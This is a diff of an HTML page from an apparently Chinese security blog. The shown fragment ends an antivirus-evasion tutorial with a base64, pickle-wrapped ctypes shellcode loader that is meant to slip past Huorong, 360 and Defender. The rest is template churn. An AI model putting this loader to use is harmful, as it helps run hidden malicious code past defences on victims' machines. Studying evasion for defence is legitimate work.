KHNoZWxsY29kZSksIDB4MTAwMCwgMHg0MCkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KHJ3eHBhZ2UsIGN0eXBlcy5jcmVhdGVfc3RyaW5nX2J1ZmZlcihzaGVsbGNvZGUpLCBsZW4oc2hlbGxjb2RlKSkKaGFuZGxlID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5DcmVhdGVUaHJlYWQoMCwgMCwgcnd4cGFnZSwgMCwgMCwgMCkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5XYWl0Rm9yU2luZ2xlT2JqZWN0KGhhbmRsZSwgLTEpcQGFcQJScQMu'  ##序列化后得到的代码
+pickle.loads(base64.b64decode(shellcode))#调用pickle.loads（）会自动调用 __reduce__（）魔术方法，从而执行exec命令，做到上线功能
+</code></pre>
+</blockquote>
 
             </div>
             <hr />
@@ -1067,7 +1192,7 @@
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="免杀对抗-免杀Ctypes-饶过Shellcode&火绒&360&Defender">
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="免杀对抗-免杀Ctypes-饶过Shellcode&火绒&360&Defender">
                         
                         <span class="card-title">免杀对抗-免杀Ctypes-饶过Shellcode&火绒&360&Defender</span>
                     </div>
@@ -1076,10 +1201,8 @@
                     <div class="summary block-with-text">
                         
                             
-
-
 免杀对抗-免杀Ctypes-饶过Shellcode&amp;火绒&amp;360&amp;Defenderpython语言中的ctypes模块是一个专门用来做免杀应用的模块
-一.加载器选择-ctypes-DLL引用&amp;执行C代码
+一.加载器选择-ctypes-DLL引用&amp;执行C代码一般
                         
                     </div>
                     <div class="publish-info">
@@ -1117,11 +1240,11 @@
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/05/18/app-gong-fang-frida-fan-zheng-shu-zhua-bao-yi-dong-an-quan-xi-tong-zi-chan-ti-qu-ping-gu-sao-miao-xposed-frida-hook-zheng-shu-xiao-yan-fan-dai-li-dai-li-zhuan-fa/">
+                <a href="/2022/05/18/5w2h-godweiyang/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="APP攻防-Frida反证书抓包&移动安全系统&资产提取&评估扫描Xposed&Frida&Hook&证书校验&反代理&代理转发">
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="APP攻防-Frida反证书抓包&移动安全系统&资产提取&评估扫描Xposed&Frida&Hook&证书校验&反代理&代理转发">
                         
                         <span class="card-title">APP攻防-Frida反证书抓包&移动安全系统&资产提取&评估扫描Xposed&Frida&Hook&证书校验&反代理&代理转发</span>
                     </div>
@@ -1332,7 +1455,7 @@ APP攻防-Frida反证书抓包&amp;移动安全系统&amp;资产提取&amp;评�
 
             
             &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-            <span class="white-color">12.6k</span>
+            <span class="white-color">14k</span>
             
 
             <br>
